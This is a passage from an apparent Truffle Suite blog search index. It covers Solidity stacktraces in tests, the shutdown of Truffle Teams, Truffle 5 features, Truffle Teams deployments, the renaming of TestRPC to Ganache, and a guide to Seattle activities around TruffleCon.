--stacktrace . Here\u2019s what the result looks like: truffle test --stacktrace The stacktrace continues seamlessly from the Javascript test into the Solidity contracts. It begins in the Javscript where the transaction was sent, continues through the contract that initially received the transaction, and finally ends in the contract where the revert occurred. These Solidity stacktraces will be printed both for reverted transactions sent during tests and for reverted deployments made during tests with Contract.new() . Stacktraces are not currently available for calls or gas estimates. Note that stacktraces are a Truffle Contract feature, and will not be available if transactions are sent by other means. What if we want a little more? Looking at the above example again, one of our stacktraces helpfully included a revert message, but the other did not. Wouldn\u2019t it be nice if it had one too? Let\u2019s try this again, but this time with --stacktrace-extra : --stacktrace-extra There we go! The --stacktrace-extra option, in addition to turning on stacktraces, additionally compiles your contracts with Solidity\u2019s debug mode, so you get more information about just why the transaction reverted. Of course, for more detailed analysis, you may want to use Truffle Debugger! But stacktraces in tests can give a good first view of why your transaction reverted. These testing options are still a little experimental, so it\u2019s possible some things may not work with them. But, in most cases, they should provide a quick helpful view into why your test transaction reverted! Thanks, Harry Altman --Debugger Engineer, Truffle Suite Click here for the release notes on GitHub","title":"Stack Tracing with Truffle Test"},{"location":"blog/sunsetting-truffle-teams/index.html","text":"N.B : we published an earlier version of this blogpost with an incorrect timeline. Truffle Teams will be sunset on September 10, 2021. After a 2 year long road, we're sunsetting Truffle Teams (effective September 10th, 2021). The journey began when Truffle was an independent company. It extended our reach from dapp development into dapp maintenance. We've gained valuable insights about the state of blockchain devops, the most desirable parts of our tools, and a new clarity around our core competencies. As an independent company, Truffle Teams was integral to building a business for the long-term, but it came with some costly tradeoffs. Over time the resources required to develop and maintain it were too great, taking time away from development of our open-source tools and eventually taking time away from supporting tasks like ecosystem engagement and development. This was unsustainable. Another important factor made this sunsetting possible: The acquisition of Truffle Suite by ConsenSys Software granted us greater supporting resources and freed us from monetary metrics. Which leads us to some good news! We are reaffirming our commitment to having the best-in-class open-source blockchain developer tools. What about paid subscribers? \u00b6 All active Pro and Enterprise tier users will receive a refund of 1 month and recurring billings will cease. If you don't see a refund within 5 days (Paddle's processing time), email us at truffle-teams@trufflesuite.com . What about my data? \u00b6 All user data will be deleted 30 days following the date of shut down (September 10th 2021). Be sure to request your data before this time, otherwise we'll be unable to guarantee recovery. If you would like a dump of your data, email us at truffle-teams@trufflesuite.com . All user data will be deleted on September 10th, 2021. Make sure to request your data before this time, otherwise we'll be unable to recover it. The afterlife is open-source \u00b6 Parts of Truffle Teams will be making their way into our open-source tools! We're happy to share one right now--repackaging the visual debugger as a plugin that allows you to launch an instance from within Truffle. Truffle Teams provided greater context around your dapps activity thanks to its GUI. Being able to pull up a list of transactions from a Ganache instance, filter by failures, and clicking a debug button was one of the better workflows that we're proud to integrate with our open-source suite. These repurposed bits will all be open-source, so you can check out the truffle-plugin-debugger repository here. The Truffle Teams visual debugger--coming to Truffle! If there are other features you'd like to see again, for example the deployments screen or contract manager, let us know! Sincerely, The Truffle Suite Team","title":"Sunsetting Truffle Teams"},{"location":"blog/sunsetting-truffle-teams/index.html#what-about-paid-subscribers","text":"All active Pro and Enterprise tier users will receive a refund of 1 month and recurring billings will cease. If you don't see a refund within 5 days (Paddle's processing time), email us at truffle-teams@trufflesuite.com .","title":"What about paid subscribers?"},{"location":"blog/sunsetting-truffle-teams/index.html#what-about-my-data","text":"All user data will be deleted 30 days following the date of shut down (September 10th 2021). Be sure to request your data before this time, otherwise we'll be unable to guarantee recovery. If you would like a dump of your data, email us at truffle-teams@trufflesuite.com . All user data will be deleted on September 10th, 2021. Make sure to request your data before this time, otherwise we'll be unable to recover it.","title":"What about my data?"},{"location":"blog/sunsetting-truffle-teams/index.html#the-afterlife-is-open-source","text":"Parts of Truffle Teams will be making their way into our open-source tools! We're happy to share one right now--repackaging the visual debugger as a plugin that allows you to launch an instance from within Truffle. Truffle Teams provided greater context around your dapps activity thanks to its GUI. Being able to pull up a list of transactions from a Ganache instance, filter by failures, and clicking a debug button was one of the better workflows that we're proud to integrate with our open-source suite. These repurposed bits will all be open-source, so you can check out the truffle-plugin-debugger repository here. The Truffle Teams visual debugger--coming to Truffle! If there are other features you'd like to see again, for example the deployments screen or contract manager, let us know! Sincerely, The Truffle Suite Team","title":"The afterlife is open-source"},{"location":"blog/take-a-dive-into-truffle-5/index.html","text":"Truffle 5 has had some exciting releases in the flexibilty they provide to your workflow. \ud83c\udf0a Truffle now offers the ability to detect the version of Solidity in your contracts at compile time and allows for compilation from ABI files. Because of this, wrangling a project whose contracts use multiple version of Solidity is much easier going forward. We've also enhanced our testing capabilities with Solidity strack traces and better event decoding, making it much easier to get to the source of an error and get richer information from events. When our projects integrate with existing protocols, it's a pain to have to deal with those external contracts. Now Truffle makes this easy with the ability to fetch external contracts verified on Etherscan! Vyper support continues to improve with experimental debugging for Vyper contracts, as well as improved import handling for Vyper. Did I mention support for decentralized file storage ? What's New in 5.2 and 5.3 \u00b6 IPFS, Filecoin, and Textile Bucket support via truffle preserve \u00b6 Tests have ran, bugs are squashed, your smart contracts have been deployed successfully to mainnet; life is good. It's time to make your dapp accessible to the masses! So you... go to a centralized host and spin up the frontend? Something's definitely off here. Enter truffle preserve : You can now use Truffle to upload your static assets to IPFS , Filecoin , and/or Textile Buckets for a fully decentralized application across the entire stack! Here are some companion pieces to help you get started: - The Filecoin Truffle Box includes a decentralized art gallery to get you started with a fully working project! - The original Filecoin + Truffle & Ganache Blog Post - truffle preserve Documentation Unbox a decentralized art gallery with the Filecoin Truffle Box. Pragma compilation \u00b6 As of version 5.2.0, Truffle now ships with a fun, experimental setting for compilation: the \u201cpragma\u201d setting. This feature analyzes your Solidity source files for their pragma expressions. It then uses these expressions to figure out which version of the Solidity compiler is required for each given source. This allows your project to compile when it contains multiple Solidity files, each requiring a different version of the Solidity compiler! To use this feature, set the Solidity compiler version field in your truffle-config.js as follows: module . exports = { compilers : { solc : { version : \u201c pragma \u201d } }, // \u2026 the rest of your config goes here }; Now you can run truffle compile and your project will compile! To illustrate this feature and the ones below, we have created a Truffle box for Truffle 5.2 . In this box you can see how the truffle-config.js is set up to use this new experimental feature. Notice that contracts/MetaCoin.sol requires ^0.7.0 and how contracts/Conversion.sol requires ^0.6.0 . When running truffle compile on this example project you should get a printout of all the versions of the Solidity compiler used during compilation. Namely, you should see that both version 0.6.12 and 0.7.6 are listed. When you use this feature, Truffle will analyze each of your Solidity sources one by one to find the appropriate version of the Solidity compiler for each source. Do note, however, that each source file and all of its imports must be compiled with one version of Solidity; this means there must be a version of the compiler that satisfies all of their pragma expressions. Things you may have missed in Truffle 5.1 \u00b6 We\u2019ve added a fair bit over the course of Truffle 5.1 as well, and there\u2019s a good chance you didn\u2019t catch all of it! We thought this would be a good time to review some of that as well! Compilation of abi.json files \u00b6 Another exciting addition to Truffle is the ability to compile from a contract\u2019s ABI. When you create a JSON source file in your \u201ccontracts\u201d directory that contains a contract\u2019s ABI, Truffle will take it, use it to create an interface, and compile it. This might come in handy, for example, when you want to import and use a library that requires a different version of the Solidity compiler than the importing file. You can then simply compile the library and create a new JSON file containing the ABI of the imported library. Under the hood Truffle will compile the ABI into a Solidity interface and create an artifact for it. You will then be able to import the interface into your contract! In the v5.2-example-box, consider the contracts/MetaCoin.sol and contracts/Conversion.sol . We would like to import Conversion into the MetaCoin contract to use it but cannot since they require different versions of the Solidity compiler. To work around this, we have created contracts/IConversion.abi.json which contains the ABI from the compiled Conversion. In this way we can now import the interface into contracts/MetaCoin.sol (see line 4 in the MetaCoin contract) to use it! Solidity stacktraces in Truffle Test \u00b6 Try running your tests with the --stacktrace option (or -t for short) and get combined Solidity-Javascript stacktraces! This feature does have some limitations and is still somewhat experimental, but we expect you\u2019ll find it quite useful. In the future we may add support for Vyper stacktraces as well! And speaking of Vyper... Experimental Vyper debugging \u00b6 You can now use Truffle Debugger with Vyper! Support for this is still in its early stages; you won\u2019t be able to inspect variables, I\u2019m afraid. But you can step through a Vyper transaction, and there will likely be more in the future! But perhaps the biggest improvement to the debugger is... Debugging verified external contracts \u00b6 Use the --fetch-external (or -x for short) option with Truffle Debugger and it will automatically download sources for any verified contracts and allow you to step through them! Contracts can be verified on either Etherscan or Sourcify. You no longer need to download these yourself and add them to your Truffle project! You can see this earlier post for more information. Improved import handling in Vyper \u00b6 Here\u2019s another one for our Vyper users; you can now do imports from other projects (via NPM or EthPM) just like in Solidity! For instance, suppose examplepackage is an NPM package which is structured as a Truffle project, and you want to import a Vyper contract, VyperContract , from it. You can now do from examplepackage.contracts import VyperContract or import examplepackage.contracts.VyperContract as VyperContract to import it, much like you could do in Solidity! Note that if your own project uses such \u201cabsolute\u201d imports as a way to import its own files from the project root -- e.g., if you have a file contracts/subdirectory/Contract1.vy which imports contracts/Contract2.vy via import Contract2 as Contract2 then this will work within your own project, but won\u2019t work if other people try to import your Contract1 . We suggest that if you want other people to import contracts from your project, you use explicitly relative imports instead: from .. import Contract2 But such imports are now possible. We hope you\u2019ll find all sorts of uses for this! Enumeration values in Truffle Contract objects \u00b6 When sending a transaction that takes an enum , it\u2019s inconvenient to have to look up the numeric constants that the enum uses. Well, now, each Truffle Contract constructor object contains enumeration constants, so you don\u2019t need to do that. Just do contractInstance . exampleMethod ( Contract . ExampleEnum . EnumValue ); and don\u2019t worry about the particular numeric value of EnumValue . You can also do Contract.enums.ExampleEnum.EnumValue , if you want to be extra-certain. Note that it\u2019s not currently possible to access enums declared outside of a contract this way, but we have plans in the future to make using those easier, too! Even more! \u00b6 Other things you might have missed include: Improved event decoding in truffle test ; being able to use the debugger to step through Yul (assembly) sources generated by Solidity for its own internal subroutines (try the g command!); being able to inspect assembly variables in the debugger; truffle test --bail ; truffle create all ; and the debugger providing more information upon transaction reversion. What's Next? Want to Help us Build it? \u00b6 How will you use the new enhancements in Truffle? Let us know what you think about these features on Twitter, and if you have other needs we haven\u2019t met yet. WE'RE HIRING! Why stop at feature requests--cut out the middleman and work with us directly! There are many exciting problems to solve like layer 2 support, mapping decoding, and a revamped deployment system, to name a few. We'd love your help and perspective. Apply here on ConsenSys' website!","title":"Take a Dive into Truffle 5"},{"location":"blog/take-a-dive-into-truffle-5/index.html#whats-new-in-52-and-53","text":"","title":"What's New in 5.2 and 5.3"},{"location":"blog/take-a-dive-into-truffle-5/index.html#ipfs-filecoin-and-textile-bucket-support-via-truffle-preserve","text":"Tests have ran, bugs are squashed, your smart contracts have been deployed successfully to mainnet; life is good. It's time to make your dapp accessible to the masses! So you... go to a centralized host and spin up the frontend? Something's definitely off here. Enter truffle preserve : You can now use Truffle to upload your static assets to IPFS , Filecoin , and/or Textile Buckets for a fully decentralized application across the entire stack! Here are some companion pieces to help you get started: - The Filecoin Truffle Box includes a decentralized art gallery to get you started with a fully working project! - The original Filecoin + Truffle & Ganache Blog Post - truffle preserve Documentation Unbox a decentralized art gallery with the Filecoin Truffle Box.","title":"IPFS, Filecoin, and Textile Bucket support via truffle preserve"},{"location":"blog/take-a-dive-into-truffle-5/index.html#pragma-compilation","text":"As of version 5.2.0, Truffle now ships with a fun, experimental setting for compilation: the \u201cpragma\u201d setting. This feature analyzes your Solidity source files for their pragma expressions. It then uses these expressions to figure out which version of the Solidity compiler is required for each given source. This allows your project to compile when it contains multiple Solidity files, each requiring a different version of the Solidity compiler! To use this feature, set the Solidity compiler version field in your truffle-config.js as follows: module . exports = { compilers : { solc : { version : \u201c pragma \u201d } }, // \u2026 the rest of your config goes here }; Now you can run truffle compile and your project will compile! To illustrate this feature and the ones below, we have created a Truffle box for Truffle 5.2 . In this box you can see how the truffle-config.js is set up to use this new experimental feature. Notice that contracts/MetaCoin.sol requires ^0.7.0 and how contracts/Conversion.sol requires ^0.6.0 . When running truffle compile on this example project you should get a printout of all the versions of the Solidity compiler used during compilation. Namely, you should see that both version 0.6.12 and 0.7.6 are listed. When you use this feature, Truffle will analyze each of your Solidity sources one by one to find the appropriate version of the Solidity compiler for each source. Do note, however, that each source file and all of its imports must be compiled with one version of Solidity; this means there must be a version of the compiler that satisfies all of their pragma expressions.","title":"Pragma compilation"},{"location":"blog/take-a-dive-into-truffle-5/index.html#things-you-may-have-missed-in-truffle-51","text":"We\u2019ve added a fair bit over the course of Truffle 5.1 as well, and there\u2019s a good chance you didn\u2019t catch all of it! We thought this would be a good time to review some of that as well!","title":"Things you may have missed in Truffle 5.1"},{"location":"blog/take-a-dive-into-truffle-5/index.html#compilation-of-abijson-files","text":"Another exciting addition to Truffle is the ability to compile from a contract\u2019s ABI. When you create a JSON source file in your \u201ccontracts\u201d directory that contains a contract\u2019s ABI, Truffle will take it, use it to create an interface, and compile it. This might come in handy, for example, when you want to import and use a library that requires a different version of the Solidity compiler than the importing file. You can then simply compile the library and create a new JSON file containing the ABI of the imported library. Under the hood Truffle will compile the ABI into a Solidity interface and create an artifact for it. You will then be able to import the interface into your contract! In the v5.2-example-box, consider the contracts/MetaCoin.sol and contracts/Conversion.sol . We would like to import Conversion into the MetaCoin contract to use it but cannot since they require different versions of the Solidity compiler. To work around this, we have created contracts/IConversion.abi.json which contains the ABI from the compiled Conversion. In this way we can now import the interface into contracts/MetaCoin.sol (see line 4 in the MetaCoin contract) to use it!","title":"Compilation of abi.json files"},{"location":"blog/take-a-dive-into-truffle-5/index.html#solidity-stacktraces-in-truffle-test","text":"Try running your tests with the --stacktrace option (or -t for short) and get combined Solidity-Javascript stacktraces! This feature does have some limitations and is still somewhat experimental, but we expect you\u2019ll find it quite useful. In the future we may add support for Vyper stacktraces as well! And speaking of Vyper...","title":"Solidity stacktraces in Truffle Test"},{"location":"blog/take-a-dive-into-truffle-5/index.html#experimental-vyper-debugging","text":"You can now use Truffle Debugger with Vyper! Support for this is still in its early stages; you won\u2019t be able to inspect variables, I\u2019m afraid. But you can step through a Vyper transaction, and there will likely be more in the future! But perhaps the biggest improvement to the debugger is...","title":"Experimental Vyper debugging"},{"location":"blog/take-a-dive-into-truffle-5/index.html#debugging-verified-external-contracts","text":"Use the --fetch-external (or -x for short) option with Truffle Debugger and it will automatically download sources for any verified contracts and allow you to step through them! Contracts can be verified on either Etherscan or Sourcify. You no longer need to download these yourself and add them to your Truffle project! You can see this earlier post for more information.","title":"Debugging verified external contracts"},{"location":"blog/take-a-dive-into-truffle-5/index.html#improved-import-handling-in-vyper","text":"Here\u2019s another one for our Vyper users; you can now do imports from other projects (via NPM or EthPM) just like in Solidity! For instance, suppose examplepackage is an NPM package which is structured as a Truffle project, and you want to import a Vyper contract, VyperContract , from it. You can now do from examplepackage.contracts import VyperContract or import examplepackage.contracts.VyperContract as VyperContract to import it, much like you could do in Solidity! Note that if your own project uses such \u201cabsolute\u201d imports as a way to import its own files from the project root -- e.g., if you have a file contracts/subdirectory/Contract1.vy which imports contracts/Contract2.vy via import Contract2 as Contract2 then this will work within your own project, but won\u2019t work if other people try to import your Contract1 . We suggest that if you want other people to import contracts from your project, you use explicitly relative imports instead: from .. import Contract2 But such imports are now possible. We hope you\u2019ll find all sorts of uses for this!","title":"Improved import handling in Vyper"},{"location":"blog/take-a-dive-into-truffle-5/index.html#enumeration-values-in-truffle-contract-objects","text":"When sending a transaction that takes an enum , it\u2019s inconvenient to have to look up the numeric constants that the enum uses. Well, now, each Truffle Contract constructor object contains enumeration constants, so you don\u2019t need to do that. Just do contractInstance . exampleMethod ( Contract . ExampleEnum . EnumValue ); and don\u2019t worry about the particular numeric value of EnumValue . You can also do Contract.enums.ExampleEnum.EnumValue , if you want to be extra-certain. Note that it\u2019s not currently possible to access enums declared outside of a contract this way, but we have plans in the future to make using those easier, too!","title":"Enumeration values in Truffle Contract objects"},{"location":"blog/take-a-dive-into-truffle-5/index.html#even-more","text":"Other things you might have missed include: Improved event decoding in truffle test ; being able to use the debugger to step through Yul (assembly) sources generated by Solidity for its own internal subroutines (try the g command!); being able to inspect assembly variables in the debugger; truffle test --bail ; truffle create all ; and the debugger providing more information upon transaction reversion.","title":"Even more!"},{"location":"blog/take-a-dive-into-truffle-5/index.html#whats-next-want-to-help-us-build-it","text":"How will you use the new enhancements in Truffle? Let us know what you think about these features on Twitter, and if you have other needs we haven\u2019t met yet. WE'RE HIRING! Why stop at feature requests--cut out the middleman and work with us directly! There are many exciting problems to solve like layer 2 support, mapping decoding, and a revamped deployment system, to name a few. We'd love your help and perspective. Apply here on ConsenSys' website!","title":"What's Next? Want to Help us Build it?"},{"location":"blog/take-control-of-your-deployments-with-truffle-teams/index.html","text":"If you read our blog post back in July , attended my TruffleCon workshop Push It! Push It Real Good: Truffle Teams Intro & Deployments back in August, or tuned in last week to our Truffle Teams Overview webinar, you've known something awesome has been in the works for Truffle Teams. Well it's finally here! On behalf of the whole team, I'm excited to announce Deployments within Truffle Teams! Bridging the Gap Between Local Ganache Testing and Public Testnet/Mainnet Deployments \u00b6 The interaction between Truffle and Ganache provides an awesome way to iteratively test and fix contracts on a personal Ethereum blockchain. However, it can be a little tricky when you're ready to publish your application to the rest of the world. That's where Truffle Teams Deployments comes in: we give you a dead-simple deployment experience which links with MetaMask so you never need to export your private keys. Benefits of Deploying with Truffle Teams \u00b6 Easily deploy to public Ethereum networks (Mainnet, Ropsten, G\u00f6rli, Rinkeby, and Kovan are supported) Works with the existing migration scripts in your Truffle project; Truffle Teams uses truffle migrate under the hood No need to export/import private keys \u2014 use MetaMask to deploy like you would with any other dapp Deploy with Ledger or Trezor hardware wallets within MetaMask Learn More in Our Tutorial or Try It Now! \u00b6 We put together a step-by-step tutorial to guide you through your first Truffle Teams deployment. While we recommend that you follow the tutorial (as it answers some FAQs), the deployment experience is simple enough for you to just give it a shot! \ud83d\udc47 Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams","title":"Take Control of Your Deployments with Truffle Teams"},{"location":"blog/take-control-of-your-deployments-with-truffle-teams/index.html#bridging-the-gap-between-local-ganache-testing-and-public-testnetmainnet-deployments","text":"The interaction between Truffle and Ganache provides an awesome way to iteratively test and fix contracts on a personal Ethereum blockchain. However, it can be a little tricky when you're ready to publish your application to the rest of the world. That's where Truffle Teams Deployments comes in: we give you a dead-simple deployment experience which links with MetaMask so you never need to export your private keys.","title":"Bridging the Gap Between Local Ganache Testing and Public Testnet/Mainnet Deployments"},{"location":"blog/take-control-of-your-deployments-with-truffle-teams/index.html#benefits-of-deploying-with-truffle-teams","text":"Easily deploy to public Ethereum networks (Mainnet, Ropsten, G\u00f6rli, Rinkeby, and Kovan are supported) Works with the existing migration scripts in your Truffle project; Truffle Teams uses truffle migrate under the hood No need to export/import private keys \u2014 use MetaMask to deploy like you would with any other dapp Deploy with Ledger or Trezor hardware wallets within MetaMask","title":"Benefits of Deploying with Truffle Teams"},{"location":"blog/take-control-of-your-deployments-with-truffle-teams/index.html#learn-more-in-our-tutorial-or-try-it-now","text":"We put together a step-by-step tutorial to guide you through your first Truffle Teams deployment. While we recommend that you follow the tutorial (as it answers some FAQs), the deployment experience is simple enough for you to just give it a shot! \ud83d\udc47 Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams","title":"Learn More in Our Tutorial or Try It Now!"},{"location":"blog/testrpc-is-now-ganache/index.html","text":"Have you been looking for the TestRPC recently and haven't been able to find it? Don't worry, it's still here! It's just now known as Ganache . Ganache comes in two flavors: a fully-interactive development blockchain with a graphical interface, and the more familiar command-line version. Get the graphical version here . For the command-line version (known as Ganache CLI ): npm install -g ganache-cli A little history \u00b6 Prior to the existence of the TestRPC, you would have to deploy to private internal test networks to see how your contract code operated (as public test networks like Ropsten didn't yet exist!). While initially under the auspices of the EthereumJS project , it was originally created by the Truffle team, and today we remain its primary maintainers. So simply for maintainability sake, it just made sense to bring the TestRPC under Truffle's wing. Additionally, we realized over time that the TestRPC was a poor name. The TestRPC quickly became more powerful than simply a blockchain environment used for testing. To stay with the sweet Truffle brand, we decided to rename it Ganache, as Ganache is (often) the core of your favorite chocolate truffle. It's a much catchier name (and a much tastier one too). Multiple ways to enjoy \u00b6 With this name change, we also released a fully-interactive, graphical version of Ganache . The command-line utility is still available via NPM; the command line flags are the same too. All that's changed is the name of the command. Ganache is also available as a library for your applications. See the README for more details. So now you have multiple ways to create a personal blockchain. If you're looking for a blockchain with a graphical environment that's perfect for beginners, check out Ganache . And if you want the familiar command-line interface, install Ganache CLI. Happy developing!","title":"TestRPC is now Ganache"},{"location":"blog/testrpc-is-now-ganache/index.html#a-little-history","text":"Prior to the existence of the TestRPC, you would have to deploy to private internal test networks to see how your contract code operated (as public test networks like Ropsten didn't yet exist!). While initially under the auspices of the EthereumJS project , it was originally created by the Truffle team, and today we remain its primary maintainers. So simply for maintainability sake, it just made sense to bring the TestRPC under Truffle's wing. Additionally, we realized over time that the TestRPC was a poor name. The TestRPC quickly became more powerful than simply a blockchain environment used for testing. To stay with the sweet Truffle brand, we decided to rename it Ganache, as Ganache is (often) the core of your favorite chocolate truffle. It's a much catchier name (and a much tastier one too).","title":"A little history"},{"location":"blog/testrpc-is-now-ganache/index.html#multiple-ways-to-enjoy","text":"With this name change, we also released a fully-interactive, graphical version of Ganache . The command-line utility is still available via NPM; the command line flags are the same too. All that's changed is the name of the command. Ganache is also available as a library for your applications. See the README for more details. So now you have multiple ways to create a personal blockchain. If you're looking for a blockchain with a graphical environment that's perfect for beginners, check out Ganache . And if you want the familiar command-line interface, install Ganache CLI. Happy developing!","title":"Multiple ways to enjoy"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html","text":"Marymoor Park \u00b6 Marymoor Park, located on the north end of Lake Sammamish in Redmond, Washington, is King County's largest, oldest, and most popular park, with more than 3 million annual visitors coming to roam its 640 acres. Marymoor is famous for its outdoor concert series during the summer. You can catch concerts on Aug 2 and Aug 4 after the day festivities at TruffleCon! Sammamish River Trail \u00b6 The Sammamish River Trail is a beautiful 19-mile bike path and recreational trail in King County, Washington that runs along the Sammamish River from Blythe Park in Bothell to Marymoor Park in Redmond. There are several places along the trail you can enter. It's perfect for biking, running, or just enjoying a nice walk in the beautiful outdoors! Idylwood Beach Park \u00b6 August can reach temperatures of up to 80 degrees, which is quite hot for Seattleites. Idylwood Beach Park is one of the best places to cool off. It's a waterfront park on Lake Sammamish with a beach, boat ramp, playground & canoe rentals. Microsoft Visitor Center \u00b6 The Microsoft Visitor Center is open during the weekdays. Walk through the doors of the Microsoft Visitor Center and unlock your potential\u2014experience everything from the latest Microsoft Research innovations to the very first personal computer. Microsoft offers self-guided tour information to explore hands-on exhibits featuring some of the company's most exciting technologies for home and business. Woodinville Wine Country \u00b6 Nestled in the beautiful Sammamish River Valley just 30 minutes northeast of Seattle, Woodinville Wine Country is home to over 100 wineries and tasting rooms representing every appellation in Washington. From the historic and beautiful grounds of Chateau Ste. Michelle to the quaint boutique wineries where you are likely to have the winemaker themselves pour you a glass of his or her finest blend, a wonderful variety of wine tasting experiences awaits you! Black Raven Brewing Company \u00b6 Black Raven is a neighborhood brewery with a friendly retail taproom, The Raven's Nest, with locations in both Redmond and Woodinville. The Raven's Nest is not a traditional brewpub; it's more like our brewery's living room. Open 7 days a week and a seating capacity of about 100, it's home to local beer lovers who want to be a part of a community that enjoy great beer and great friends. Mac & Jack's Brewing \u00b6 Mac and Jack's brewing offer a tasting room, retail store, beer garden, and tours at their brewery in Redmond, WA. Mac & Jack's started out of Jack's garage in 1993, with nothing but a passion for exceptional beer. Lots of hops and 26 years later they are still producing one of Seattle's favorite beverages. Flee Escape Room \u00b6 Flee Escape Game is one of the largest Seattle and Redmond Real Life Escape Rooms. So grab your team, new friends you just met, or organize a party to see if you can all make your great escape. Paragliding \u00b6 Come paraglide tandem with us, and experience free flight in its purest form! After running down a moderately steep hill you'll find yourself airborne, sitting comfortably in a reclined harness, your feet dangling above the trees, no one in front of you (pilot rides in back) and no cockpit surrounding you. Depending on conditions you'll have views of Mt. Rainier, Mt. Si, Lake Sammamish, Bellevue, Seattle, the Puget Sound and so much more. Bald eagles and other predators leave their nests to ride the same thermals allowing you to literally fly with birds. Salish Lodge/Snoqualmie Falls \u00b6 Overlooking Snoqualmie Falls, just 30 minutes east of Seattle and Bellevue, Salish Lodge & Spa is a Washington State resort getaway, perfect for those seeking an authentic and memorable escape from the everyday. Dine on mouthwatering Northwest cuisine hand-crafted from seasonal ingredients, savor the serenity of The Spa , then drift off to sleep in front of your cozy fireplace in one of our newly renovated guestrooms. We invite you to experience the iconic Salish Lodge. DirtFish Rally Driving School \u00b6 Nestled in the foothills of the Cascade Mountain Range in the scenic town of Snoqualmie, WA, DirtFish Rally School was established in 2010 with the idea that the exciting sport of rally should be accessible to everyone. Armed with an immaculate fleet of turbocharged, all-wheel-drive cars, right from the beginning DirtFish was equipped to share with anyone the excitement of what a real rally car can do on a loose surface. In the fall of 2014, DirtFish embellished their offerings with the launch of rear-wheel drive programs. Similar in nature to the all-wheel drive programs, the precise and very sideways action the classes offer provides an entirely different challenge for drivers of every background. Ever since, DirtFish has become the most prestigious rally school in North America, providing the highest level of instruction, top level cars and gorgeous facilities all year round. Hiking \u00b6 Hiking in nature has a positive impact on people's hearts, minds and bodies. It is vital for everyone to have the opportunity to access the outdoors, and the WTA is committed to reducing barriers to hiking trails and lands. We strive to inspire people to go outside\u2014giving them the skills and knowledge they need to recreate safely and sustainably. People will protect the places they love to hike. WTA rallies hikers to raise our collective voice to protect the places we love. Our voice is amplified by the support of our members and sweat equity of every volunteer who helps to build and maintain trails. Mountain Biking \u00b6 Your all-inclusive mountain biking tour in Seattle includes pickup from Downtown Seattle or Bellevue and shuttle transportation to our favorite trails for intermediate and experienced cyclists. At the trailhead, you get your high-quality mountain bike, a helmet, gloves, and any other safety gear needed for our ride. Don't worry, we have plenty of water and snacks for our mountain biking adventure!","title":"The Best Things to do in Seattle During TruffleCon"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#marymoor-park","text":"Marymoor Park, located on the north end of Lake Sammamish in Redmond, Washington, is King County's largest, oldest, and most popular park, with more than 3 million annual visitors coming to roam its 640 acres. Marymoor is famous for its outdoor concert series during the summer. You can catch concerts on Aug 2 and Aug 4 after the day festivities at TruffleCon!","title":"Marymoor Park"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#sammamish-river-trail","text":"The Sammamish River Trail is a beautiful 19-mile bike path and recreational trail in King County, Washington that runs along the Sammamish River from Blythe Park in Bothell to Marymoor Park in Redmond. There are several places along the trail you can enter. It's perfect for biking, running, or just enjoying a nice walk in the beautiful outdoors!","title":"Sammamish River Trail"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#idylwood-beach-park","text":"August can reach temperatures of up to 80 degrees, which is quite hot for Seattleites. Idylwood Beach Park is one of the best places to cool off. It's a waterfront park on Lake Sammamish with a beach, boat ramp, playground & canoe rentals.","title":"Idylwood Beach Park"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#microsoft-visitor-center","text":"The Microsoft Visitor Center is open during the weekdays. Walk through the doors of the Microsoft Visitor Center and unlock your potential\u2014experience everything from the latest Microsoft Research innovations to the very first personal computer. Microsoft offers self-guided tour information to explore hands-on exhibits featuring some of the company's most exciting technologies for home and business.","title":"Microsoft Visitor Center"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#woodinville-wine-country","text":"Nestled in the beautiful Sammamish River Valley just 30 minutes northeast of Seattle, Woodinville Wine Country is home to over 100 wineries and tasting rooms representing every appellation in Washington. From the historic and beautiful grounds of Chateau Ste. Michelle to the quaint boutique wineries where you are likely to have the winemaker themselves pour you a glass of his or her finest blend, a wonderful variety of wine tasting experiences awaits you!","title":"Woodinville Wine Country"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#black-raven-brewing-company","text":"Black Raven is a neighborhood brewery with a friendly retail taproom, The Raven's Nest, with locations in both Redmond and Woodinville. The Raven's Nest is not a traditional brewpub; it's more like our brewery's living room. Open 7 days a week and a seating capacity of about 100, it's home to local beer lovers who want to be a part of a community that enjoy great beer and great friends.","title":"Black Raven Brewing Company"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#mac-jacks-brewing","text":"Mac and Jack's brewing offer a tasting room, retail store, beer garden, and tours at their brewery in Redmond, WA. Mac & Jack's started out of Jack's garage in 1993, with nothing but a passion for exceptional beer. Lots of hops and 26 years later they are still producing one of Seattle's favorite beverages.","title":"Mac &amp; Jack's Brewing"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#flee-escape-room","text":"Flee Escape Game is one of the largest Seattle and Redmond Real Life Escape Rooms. So grab your team, new friends you just met, or organize a party to see if you can all make your great escape.","title":"Flee Escape Room"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#paragliding","text":"Come paraglide tandem with us, and experience free flight in its purest form! After running down a moderately steep hill you'll find yourself airborne, sitting comfortably in a reclined harness, your feet dangling above the trees, no one in front of you (pilot rides in back) and no cockpit surrounding you. Depending on conditions you'll have views of Mt. Rainier, Mt. Si, Lake Sammamish, Bellevue, Seattle, the Puget Sound and so much more. Bald eagles and other predators leave their nests to ride the same thermals allowing you to literally fly with birds.","title":"Paragliding"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#salish-lodgesnoqualmie-falls","text":"Overlooking Snoqualmie Falls, just 30 minutes east of Seattle and Bellevue, Salish Lodge & Spa is a Washington State resort getaway, perfect for those seeking an authentic and memorable escape from the everyday. Dine on mouthwatering Northwest cuisine hand-crafted from seasonal ingredients, savor the serenity of The Spa , then drift off to sleep in front of your cozy fireplace in one of our newly renovated guestrooms. We invite you to experience the iconic Salish Lodge.","title":"Salish Lodge/Snoqualmie Falls"},{"location":"blog/the-best-things-to-do-in-seattle-during-trufflecon/index.html#dirtfish-rally-driving-school","text":"Nestled in the foothills of the Cascade Mountain Range in the scenic town of Snoqualmie, WA, DirtFish Rally School was established in 2010 with the idea that the exciting sport of rally should be 